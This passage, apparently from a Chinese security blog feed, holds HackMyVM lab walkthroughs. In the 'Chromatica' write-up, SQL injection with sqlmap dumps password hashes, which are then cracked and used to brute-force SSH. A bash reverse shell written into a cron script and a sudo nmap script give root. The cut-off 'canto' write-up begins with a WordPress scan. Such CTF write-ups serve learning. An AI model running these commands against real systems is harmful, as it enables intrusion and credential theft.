    Payload: city=a' AND (SELECT 4754 FROM (SELECT(SLEEP(5)))EmlP) AND 'wTdJ'='wTdJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: city=a' UNION ALL SELECT NULL,CONCAT(0x716a7a7a71,0x44665871747363734657436a6b47695046565047526e5a454a7765706d7148534f4645566e445858,0x7178626b71),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[14:28:16] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
[14:28:16] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-12302024_0228pm.csv'                                                                                                         

[*] ending @ 14:28:16 /2024-12-30/

                                                                    
```

一发入魂

```bash
┌──(kali㉿kali)-[~/test]
└─$ sqlmap -u 'http://192.168.205.215/dev-portal/' --forms --batch --user-agent dev -D Chromatica -T users -C username,password --dump
        ___
       __H__                                                                                                                         
 ___ ___[,]_____ ___ ___  {1.8.12#stable}                                                                                              
|_ -| . [']     | .'| . |                                                                                                            
|___|_  [']_|_|_|__,|  _|                                                                                                            
      |_|V...       |_|   https://sqlmap.org                                                                                         

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:31:19 /2024-12-30/

[14:31:19] [INFO] testing connection to the target URL
[14:31:19] [INFO] searching for forms
[1/1] Form:
GET http://192.168.205.215/dev-portal/search.php?city=
do you want to test this form? [Y/n/q] 
&gt; Y
Edit GET data [default: city=]: city=
do you want to fill blank fields with random values? [Y/n] Y
[14:31:19] [INFO] resuming back-end DBMS 'mysql' 
[14:31:19] [INFO] using '/home/kali/.local/share/sqlmap/output/results-12302024_0231pm.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: city (GET)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: city=a' AND (SELECT 4754 FROM (SELECT(SLEEP(5)))EmlP) AND 'wTdJ'='wTdJ

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: city=a' UNION ALL SELECT NULL,CONCAT(0x716a7a7a71,0x44665871747363734657436a6b47695046565047526e5a454a7765706d7148534f4645566e445858,0x7178626b71),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[14:31:19] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
[14:31:19] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'Chromatica'
[14:31:19] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [y/N/q] N
Database: Chromatica
Table: users
[5 entries]
+-----------+----------------------------------+
| username  | password                         |
+-----------+----------------------------------+
| admin     | 8d06f5ae0a469178b28bbd34d1da6ef3 |
| dev       | 1ea6762d9b86b5676052d1ebd5f649d7 |
| user      | 3dd0f70a06e2900693fc4b684484ac85 |
| dev-selim | f220c85e3ff19d043def2578888fb4e5 |
| intern    | aaf7fb4d4bffb8c8002978a9c9c6ddc9 |
+-----------+----------------------------------+

[14:31:19] [INFO] table 'Chromatica.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/192.168.205.215/dump/Chromatica/users.csv'                                                                                                                             
[14:31:19] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-12302024_0231pm.csv'                                                                                                         

[*] ending @ 14:31:19 /2024-12-30/

                                                      
```

提取一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat tmp|awk -F ' ' '{print $2 ':' $4}' 
:
username:password
:
admin:8d06f5ae0a469178b28bbd34d1da6ef3
dev:1ea6762d9b86b5676052d1ebd5f649d7
user:3dd0f70a06e2900693fc4b684484ac85
dev-selim:f220c85e3ff19d043def2578888fb4e5
intern:aaf7fb4d4bffb8c8002978a9c9c6ddc9
:
:

```

直接复制就好了

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat tmp1
admin:8d06f5ae0a469178b28bbd34d1da6ef3
dev:1ea6762d9b86b5676052d1ebd5f649d7
user:3dd0f70a06e2900693fc4b684484ac85
dev-selim:f220c85e3ff19d043def2578888fb4e5
intern:aaf7fb4d4bffb8c8002978a9c9c6ddc9
                                             
┌──(kali㉿kali)-[~/test]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt tmp1 --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
keeptrying       (user)   
1g 0:00:00:00 DONE (2024-12-30 14:38) 1.785g/s 25613Kp/s 25613Kc/s 102933KC/s  fuckyooh21..*7¡Vamos!
Use the '--show --format=Raw-MD5' options to display all of the cracked passwords reliably
Session completed. 
                    
```

爆不出来丢[[crackstation](https://crackstation.net/)](https://crackstation.net/)看有没有结果

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat tmp1|awk -F ':' '{print $2}'
8d06f5ae0a469178b28bbd34d1da6ef3
1ea6762d9b86b5676052d1ebd5f649d7
3dd0f70a06e2900693fc4b684484ac85
f220c85e3ff19d043def2578888fb4e5
aaf7fb4d4bffb8c8002978a9c9c6ddc9

```

![image](https://github.com/user-attachments/assets/6c3f0b6d-209e-4810-81e7-674c868ae20d)

构建一下`user`和`pass`爆破ssh

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat tmp1|awk -F ':' '{print $1}' &gt; user
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat user                             
admin
dev
user
dev-selim
intern

┌──(kali㉿kali)-[~/test]
└─$ cat tmp1|awk -F ':' '{print $2}' &gt; pass
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat pass                             
8d06f5ae0a469178b28bbd34d1da6ef3
1ea6762d9b86b5676052d1ebd5f649d7
3dd0f70a06e2900693fc4b684484ac85
f220c85e3ff19d043def2578888fb4e5
aaf7fb4d4bffb8c8002978a9c9c6ddc9

#然后把crackstation结果手输进去

┌──(kali㉿kali)-[~/test]
└─$ vim pass
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cat pass
8d06f5ae0a469178b28bbd34d1da6ef3
1ea6762d9b86b5676052d1ebd5f649d7
3dd0f70a06e2900693fc4b684484ac85
f220c85e3ff19d043def2578888fb4e5
aaf7fb4d4bffb8c8002978a9c9c6ddc9
adm!n
flaghere
keeptrying
intern00
                
```

当然你把那个网格复制下来过滤也行

### 3.ssh 爆破

```bash
┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P pass ssh://192.168.205.215 -V -I -u -f -e nsr -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-30 14:44:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 60 tasks per 1 server, overall 60 tasks, 60 login tries (l:5/p:12), ~1 try per task
[DATA] attacking ssh://192.168.205.215:22/
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'admin' - 1 of 60 [child 0] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'dev' - 2 of 60 [child 1] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'user' - 3 of 60 [child 2] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'dev-selim' - 4 of 60 [child 3] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'intern' - 5 of 60 [child 4] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass '' - 6 of 60 [child 5] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass '' - 7 of 60 [child 6] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass '' - 8 of 60 [child 7] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass '' - 9 of 60 [child 8] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass '' - 10 of 60 [child 9] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'nimda' - 11 of 60 [child 10] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'ved' - 12 of 60 [child 11] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'resu' - 13 of 60 [child 12] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'miles-ved' - 14 of 60 [child 13] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'nretni' - 15 of 60 [child 14] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 16 of 60 [child 15] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 17 of 60 [child 16] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 18 of 60 [child 17] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 19 of 60 [child 18] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 20 of 60 [child 19] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 21 of 60 [child 20] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 22 of 60 [child 21] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 23 of 60 [child 22] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 24 of 60 [child 23] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 25 of 60 [child 24] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass '3dd0f70a06e2900693fc4b684484ac85' - 26 of 60 [child 25] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass '3dd0f70a06e2900693fc4b684484ac85' - 27 of 60 [child 26] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass '3dd0f70a06e2900693fc4b684484ac85' - 28 of 60 [child 27] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass '3dd0f70a06e2900693fc4b684484ac85' - 29 of 60 [child 28] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass '3dd0f70a06e2900693fc4b684484ac85' - 30 of 60 [child 29] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'f220c85e3ff19d043def2578888fb4e5' - 31 of 60 [child 30] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'f220c85e3ff19d043def2578888fb4e5' - 32 of 60 [child 31] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'f220c85e3ff19d043def2578888fb4e5' - 33 of 60 [child 32] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'f220c85e3ff19d043def2578888fb4e5' - 34 of 60 [child 33] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'f220c85e3ff19d043def2578888fb4e5' - 35 of 60 [child 34] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 36 of 60 [child 35] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 37 of 60 [child 36] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 38 of 60 [child 37] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 39 of 60 [child 38] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 40 of 60 [child 39] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'adm!n' - 41 of 60 [child 40] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'adm!n' - 42 of 60 [child 41] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'adm!n' - 43 of 60 [child 42] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'adm!n' - 44 of 60 [child 43] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'adm!n' - 45 of 60 [child 44] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'flaghere' - 46 of 60 [child 45] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'flaghere' - 47 of 60 [child 46] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'flaghere' - 48 of 60 [child 47] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'flaghere' - 49 of 60 [child 48] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'flaghere' - 50 of 60 [child 49] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'keeptrying' - 51 of 60 [child 50] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'keeptrying' - 52 of 60 [child 51] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'keeptrying' - 53 of 60 [child 52] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'keeptrying' - 54 of 60 [child 53] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'keeptrying' - 55 of 60 [child 54] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'intern00' - 56 of 60 [child 55] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'intern00' - 57 of 60 [child 56] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'user' - pass 'intern00' - 58 of 60 [child 57] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'intern00' - 59 of 60 [child 58] (0/0)
[ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'intern00' - 60 of 60 [child 59] (0/0)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'dev-selim' - 61 of 79 [child 8] (1/19)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'miles-ved' - 62 of 79 [child 6] (2/19)
[REDO-ATTEMPT] target 192.168.205.215 - login 'user' - pass '3dd0f70a06e2900693fc4b684484ac85' - 63 of 79 [child 7] (3/19)
[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'f220c85e3ff19d043def2578888fb4e5' - 64 of 79 [child 9] (4/19)
[REDO-ATTEMPT] target 192.168.205.215 - login 'user' - pass 'f220c85e3ff19d043def2578888fb4e5' - 65 of 80 [child 5] (5/20)
[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 66 of 80 [child 14] (6/20)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 67 of 81 [child 34] (7/21)
[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'intern00' - 68 of 82 [child 39] (8/22)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass '8d06f5ae0a469178b28bbd34d1da6ef3' - 69 of 82 [child 4] (9/22)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'intern00' - 70 of 83 [child 19] (10/23)
[REDO-ATTEMPT] target 192.168.205.215 - login 'intern' - pass '1ea6762d9b86b5676052d1ebd5f649d7' - 71 of 84 [child 44] (11/24)
[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass '3dd0f70a06e2900693fc4b684484ac85' - 72 of 84 [child 29] (12/24)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass '3dd0f70a06e2900693fc4b684484ac85' - 73 of 85 [child 54] (13/25)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'flaghere' - 74 of 86 [child 5] (14/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'flaghere' - 75 of 86 [child 8] (15/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'flaghere' - 76 of 86 [child 23] (16/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev' - pass 'keeptrying' - 77 of 86 [child 18] (17/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'dev-selim' - pass 'intern00' - 78 of 86 [child 33] (18/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'intern' - pass 'intern00' - 79 of 86 [child 28] (19/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'f220c85e3ff19d043def2578888fb4e5' - 80 of 86 [child 43] (20/26)
[REDO-ATTEMPT] target 192.168.205.215 - login 'admin' - pass 'aaf7fb4d4bffb8c8002978a9c9c6ddc9' - 81 of 87 [child 53] (21/27)
[22][ssh] host: 192.168.205.215   login: dev   password: flaghere
[STATUS] attack finished for 192.168.205.215 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-30 14:44:53
                                                                                  
```

挺快的，就86种可能

### 4.提权

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh dev@192.168.205.215                                                                                                         
dev@192.168.205.215's password: 
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

brightctf{ALM0ST_TH3R3_34897ffdf69}
Connection to 192.168.205.215 closed.
                                             
翻译：
您好，
此帐户不是登录帐户
如果您想对此帐户进行维护，您必须
联系您的管理员
或跳出思维定式
偷懒并联系您的管理员
或者也许您应该多动动脑子，呵呵，
问候

brightctf{ALM0ST_TH3R3_34897ffdf69}
与 192.168.205.215 的连接已关闭。
```

把我踢下线了，看看详细

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh dev@192.168.205.215 -v
OpenSSH_9.9p1 Debian-3, OpenSSL 3.3.2 3 Sep 2024
......
dev@192.168.205.215's password: 
Authenticated to 192.168.205.215 ([192.168.205.215]:22) using 'password'.
debug1: channel 0: new session [client-session] (inactive timeout: 0)
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: filesystem
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: client_input_hostkeys: searching /home/kali/.ssh/known_hosts for 192.168.205.215 / (none)
debug1: client_input_hostkeys: searching /home/kali/.ssh/known_hosts2 for 192.168.205.215 / (none)
debug1: client_input_hostkeys: hostkeys file /home/kali/.ssh/known_hosts2 does not exist
debug1: client_input_hostkeys: no new or deprecated keys from server
debug1: Sending environment.
debug1: channel 0: setting env LANG = 'zh_CN.UTF-8'
debug1: pledge: fork
GREETINGS,
THIS ACCOUNT IS NOT A LOGIN ACCOUNT
IF YOU WANNA DO SOME MAINTENANCE ON THIS ACCOUNT YOU HAVE TO
EITHER CONTACT YOUR ADMIN
OR THINK OUTSIDE THE BOX
BE LAZY AND CONTACT YOUR ADMIN
OR MAYBE YOU SHOULD USE YOUR HEAD MORE heh,,
REGARDS

brightctf{ALM0ST_TH3R3_34897ffdf69}
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
debug1: channel 0: free: client-session, nchannels 1
Connection to 192.168.205.215 closed.
Transferred: sent 3964, received 3860 bytes, in 0.4 seconds
Bytes per second: sent 11238.5, received 10943.6
debug1: Exit status 0
                   

翻译：
使用“密码”向 192.168.205.215 ([192.168.205.215]:22) 进行身份验证。
debug1：通道 0：新会话 [client-session]（非活动超时：0）
debug1：请求 no-more-sessions@openssh.com
debug1：进入交互式会话。
debug1：承诺：文件系统
debug1：client_input_global_request：rtype hostkeys-00@openssh.com want_reply 0
debug1：client_input_hostkeys：在 /home/kali/.ssh/known_hosts 中搜索 192.168.205.215 / (无)
debug1：client_input_hostkeys：在 /home/kali/.ssh/known_hosts2 中搜索 192.168.205.215 / (无)
debug1：client_input_hostkeys：hostkeys 文件 /home/kali/.ssh/known_hosts2 不存在
debug1：client_input_hostkeys：没有来自服务器的新密钥或弃用的密钥
debug1：正在发送环境。
debug1：频道 0：设置环境语言 =“zh_CN.UTF-8”
debug1：承诺：fork
```

创建了会话，不会了，去看了`HGBE`大佬的wp，原来是那个缩小提权的那个东西啊

![image](https://github.com/user-attachments/assets/4f9018e3-67e2-498e-9dff-ea74a21c3134)

输入`!/bin/bash`就可以放大了

![image](https://github.com/user-attachments/assets/e49d4e3a-a938-4ab1-9637-0d0dd1aa7983)

他是这样实现的，可以学习一下

![image](https://github.com/user-attachments/assets/960705b3-aedc-493a-8c1b-0f751fe82604)

```bash
dev@Chromatica:~$ ls -al
total 72                                                                                                                             
drwxr-x--- 7 dev  dev  4096 Apr 18  2024 .                                                                                           
drwxr-xr-x 4 root root 4096 Mar 28  2023 ..                                                                                          
-rw------- 1 dev  dev  3467 Apr 24  2024 .bash_history                                                                               
-rw-r--r-- 1 dev  dev   220 Jan  6  2022 .bash_logout                                                                                
-rw-r--r-- 1 dev  dev  3814 Mar 28  2023 .bashrc                                                                                     
-rwxrwxr-x 1 root root   56 Mar 28  2023 bye.sh                                                                                      
drwx------ 2 dev  dev  4096 Mar 21  2023 .cache                                                                                      
drwxrwxr-x 3 dev  dev  4096 Mar 21  2023 .config                                                                                     
drwx------ 3 dev  dev  4096 Apr 18  2024 .gnupg                                                                                      
-rw-rw-r-- 1 root root  280 Jun  2  2023 hello.txt                                                                                   
-rw------- 1 dev  dev    20 Mar 28  2023 .lesshst                                                                                    
-rw-r--r-- 1 dev  dev   807 Jan  6  2022 .profile                                                                                    
drwx------ 4 dev  dev  4096 Mar 27  2023 snap                                                                                        
-rw-r--r-- 1 root root   35 May 23  2023 user.txt                                                                                    
drwxr-xr-x 2 dev  dev  4096 Jun 19  2023 .vim                                                                                        
-rw------- 1 dev  dev  9900 Apr 18  2024 .viminfo      
```

`.bash_history`他没删除，我们直接看就好了

![image](https://github.com/user-attachments/assets/efa406ee-523b-40c5-9799-e4773c6ed1d2)

感兴趣

![image](https://github.com/user-attachments/assets/d91a47c5-10cd-49d6-9e4e-94d4c4d09f56)

我们可以执行还是`analyst`用户的，我直接甩了一个反弹shell上去

```bash
dev@Chromatica:~$ echo 'bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'' &gt; /opt/scripts/end_of_day.sh
dev@Chromatica:~$ cat /opt/scripts/end_of_day.sh
bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.141/8888 0&gt;&amp;1'

```

让子弹飞会

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
id
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.215] 58754
bash: cannot set terminal process group (3073): Inappropriate ioctl for device
bash: no job control in this shell
analyst@Chromatica:~$ id
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
analyst@Chromatica:~$ 

```

弹回来了

```bash
analyst@Chromatica:~$ sudo -l
sudo -l
Matching Defaults entries for analyst on Chromatica:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User analyst may run the following commands on Chromatica:
    (ALL : ALL) NOPASSWD: /usr/bin/nmap

```

可以使用`sudo`权限执行nmap，打开`https://gtfobins.github.io/`搜一下就有了

![image](https://github.com/user-attachments/assets/90440358-1d07-47d8-ac52-8ed56ed63e60)

```bash
analyst@Chromatica:~$ TF=$(mktemp)
TF=$(mktemp)
analyst@Chromatica:~$ echo 'os.execute('/bin/sh')' &gt; $TF
echo 'os.execute('/bin/sh')' &gt; $TF
analyst@Chromatica:~$ sudo nmap --script=$TF
sudo nmap --script=$TF
Starting Nmap 7.80 ( https://nmap.org ) at 2024-12-30 06:59 UTC
NSE: Warning: Loading '/tmp/tmp.C0v28yTvbc' -- the recommended file extension is '.nse'.
id
uid=0(root) gid=0(root) groups=0(root)
```

拿到root了，如果你觉得交互shell不好用bash -p 或者自己再弹一个shell回来加固一下就好了sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Chromatica.html</guid><pubDate>Fri, 27 Jun 2025 09:32:48 +0000</pubDate></item><item><title>hmv_canto</title><link>https://7r1UMPHK.github.io/post/hmv_canto.html</link><description># hmv_canto

**靶机**：https://hackmyvm.eu/machines/machine.php?vm=canto
**难度**：绿色
**目标 IP**：192.168.205.213
**本机** IP：192.168.205.141

---

### **1. 端口枚举及服务探测**

首先，使用 `nmap` 扫描目标 IP 的开放端口：

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sT -O -Pn -n -p- 192.168.205.213
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-29 19:05 CST
Nmap scan report for 192.168.205.213
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.3p1 Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Ubuntu))
MAC Address: 08:00:27:80:A9:92 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.13 seconds

```

扫描结果显示目标机器开放了 22 (SSH) 和 80 (HTTP) 端口。

---

### **2. Web 服务探测与Wordpress Plugin Canto远程执行漏洞**

对 80 端口感兴趣，访问 Web 页面，扫描一下结构

```bash
┌──(kali㉿kali)-[~]
└─$ whatweb http://192.168.205.213        
http://192.168.205.213 [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.57 (Ubuntu)], IP[192.168.205.213], MetaGenerator[WordPress 6.7.1], Script[importmap,module], Title[Canto], UncommonHeaders[link], WordPress[6.7.1]
                                                                                                
```

是WordPress，wpscan启动

```bash
┌──(kali㉿kali)-[~]
└─$ wpscan --url http://192.168.205.213 -e vp,u --api-token xxx   #api-token注册wpscan官网获取
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.205.213/ [192.168.205.213]
[+] Started: Sun Dec 29 19:08:22 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.205.213/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.205.213/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.205.213/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.205.213/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Latest, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.205.213/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=6.7.1&lt;/generator&gt;
